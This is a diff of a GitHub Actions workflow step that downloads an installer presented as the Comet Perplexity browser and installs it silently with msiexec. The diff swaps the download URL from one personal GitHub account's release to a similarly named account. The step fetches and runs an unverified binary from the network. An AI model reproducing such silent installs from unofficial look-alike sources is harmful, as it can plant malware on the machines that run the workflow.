@@ -72,8 +72,8 @@ jobs:
 
       - name: Install and Launch Comet Browser
         run: |
-          $browserUrl = "https://github.com/hhaidernisar/ali/releases/download/v1.0/comet_installer_latest.msi"
-          $installerPath = "$env:TEMP\comet-setup.exe"
+          $browserUrl = "https://github.com/khaidernizar/ai/releases/download/v1.0/comet_installer_latest.msi"
+          $installerPath = "$env:TEMP\comet-setup.msi"
           $desktopPath = "$env:USERPROFILE\Desktop"
           
           Write-Host "Downloading Comet Perplexity Browser..."
@@ -86,8 +86,13 @@ jobs:
               exit 0
           }
           
-          Write-Host "Installing browser silently..."
-          Start-Process -FilePath $installerPath -ArgumentList "/S", "/D=C:\Program Files\Comet" -Wait -NoNewWindow
+          Write-Host "Installing browser via MSI..."
+          try {
+              Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait -NoNewWindow
+              Write-Host "Browser installation completed"
+          } catch {
+              Write-Warning "MSI installation failed: $_"
+          }
           
           Write-Host "Creating desktop shortcut..."
           $browserExe = "C:\Program Files\Comet\comet.exe"
